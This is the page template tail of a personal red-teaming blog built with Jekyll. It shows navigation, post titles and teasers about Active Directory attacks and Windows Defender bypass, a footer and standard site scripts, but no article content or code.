data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Active-Directory-Domain-Persistence/">Active Directory - Domain Persistence</a><li><a href="/posts/Active-Directory-Lateral-Movement/">Active Directory - Lateral Movement</a><li><a href="/posts/Active-Directory-Introduction/">Active Directory - Introduction</a><li><a href="/posts/CRTE-Exam-Review/">CRTE Exam Review</a><li><a href="/posts/Bypassing-Windows-Defender/">Bypassing Windows Defender</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/amsi-bypass/">amsi-bypass</a> <a class="post-tag" href="/tags/password-reuse/">password-reuse</a> <a class="post-tag" href="/tags/acl-enumeration/">ACL-enumeration</a> <a class="post-tag" href="/tags/active-directory-domain-persistence/">active-directory-domain-persistence</a> <a class="post-tag" href="/tags/active-directory-enumeration/">active-directory-enumeration</a> <a class="post-tag" href="/tags/active-directory-introduction/">active-directory-introduction</a> <a class="post-tag" href="/tags/active-directory-lateral-movement/">active-directory-lateral-movement</a> <a class="post-tag" href="/tags/active-directory-local-privilege-escalation/">active-directory-local-privilege-escalation</a> <a class="post-tag" href="/tags/as-rep/">AS-REP</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Active-Directory-Lateral-Movement/"><div class="card-body"> <em class="timeago small" data-ts="1649404500" > 2022-04-08 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Active Directory - Lateral Movement</h3><div class="text-muted small"><p> Introduction Welcome to my fourth article in the Red Teaming Series (Active Directory Lateral Movement). I hope everyone has gone through the previous articles of this series which go through th...</p></div></div></a></div><div class="card"> <a href="/posts/Active-Directory-Domain-Persistence/"><div class="card-body"> <em class="timeago small" data-ts="1649554500" > 2022-04-10 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Active Directory - Domain Persistence</h3><div class="text-muted small"><p> Introduction Welcome to my fifth article in the Red Teaming Series (Active Directory Domain Persistence). I hope everyone has gone through the previous articles of this series which go through t...</p></div></div></a></div><div class="card"> <a href="/posts/Bypassing-Windows-Defender/"><div class="card-body"> <em class="timeago small" data-ts="1684074600" > 2023-05-14 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Bypassing Windows Defender</h3><div class="text-muted small"><p> Introduction Greetings, everyone 👋. In this brief article, I will outline a manual obfuscation technique for bypassing Windows Defender. Specifically, I will cover how to patch the Antimalware S...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Active-Directory-Introduction/" class="btn btn-outline-primary" prompt="Older"><p>Active Directory - Introduction</p></a> <a href="/posts/Active-Directory-Windows-Local-Priv-Esc/" class="btn btn-outline-primary" prompt="Newer"><p>Active Directory - Local Privilege Escalation</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://twitter.com/Bhaskarpal__">Bhaskar Pal</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/amsi-bypass/">amsi-bypass</a> <a class="post-tag" href="/tags/password-reuse/">password-reuse</a> <a class="post-tag" href="/tags/acl-enumeration/">ACL-enumeration</a> <a class="post-tag" href="/tags/active-directory-domain-persistence/">active-directory-domain-persistence</a> <a class="post-tag" href="/tags/active-directory-enumeration/">active-directory-enumeration</a> <a class="post-tag" href="/tags/active-directory-introduction/">active-directory-introduction</a> <a class="post-tag" href="/tags/active-directory-lateral-movement/">active-directory-lateral-movement</a> <a class="post-tag" href="/tags/active-directory-local-privilege-escalation/">active-directory-local-privilege-escalation</a> <a class="post-tag" href="/tags/as-rep/">AS-REP</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-GZYBNZRQNP"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-GZYBNZRQNP'); }); </script>
